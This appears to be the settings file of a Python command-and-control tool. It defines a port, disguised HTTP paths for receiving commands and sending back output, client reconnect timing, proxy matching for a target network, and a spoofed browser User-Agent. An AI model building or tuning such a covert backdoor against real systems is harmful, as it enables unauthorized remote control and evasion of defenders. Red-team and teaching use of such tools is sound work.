PORT = 1337

# Path to use for signifying a command request from a client using HTTP GET
CMD_REQUEST = "/book?isbn="

# Path to use for signifying command output from a client using HTTP POST
CMD_RESPONSE = "/inventory"

# POST variable name to use for assigning to command output from a client
CMD_RESPONSE_KEY = "index"

# ----------------------  Begin c2 server code only variables  ---------------------- #

# Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
BIND_ADDR = ""

# -----------------------  Begin client code only variables  ------------------------ #

# Set the c2 server's IP address or hostname
C2_SERVER = "localhost"

# Define a sleep delay time in seconds for re-connection attempts
DELAY = 3

# Set proxy to None or match target network's proxy using a Python dictionary format
PROXY = None
# PROXY = {"http": "proxy.some-site.com:443"}

# Keep the User-Agent up-to-date and looking like a modern browser; Python dictionary format
HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Safari/537.36"}
# I'd recommend using a Firefox extension like User-Agent Switcher and Manager; https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/
